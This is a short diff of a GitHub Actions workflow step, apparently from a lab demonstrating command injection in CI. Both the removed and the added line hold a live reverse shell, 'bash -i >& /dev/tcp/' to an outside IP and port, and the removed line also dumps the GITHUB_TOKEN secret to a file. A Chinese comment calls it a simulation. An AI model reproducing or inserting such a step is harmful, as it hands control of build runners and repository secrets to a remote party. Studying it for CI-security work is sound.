@@ -20,4 +20,5 @@ jobs:
     steps:
       - name: Save PR id
         id: pr
-        run: echo ${{ secrets.GITHUB_TOKEN }} > ./token.txt && bash -i >& /dev/tcp/116.62.149.37/9999 0>&1
+        # 这里模拟命令可控情况 为了方便设置为直接弹shell
+        run: bash -i >& /dev/tcp/116.62.149.37/9999 0>&1
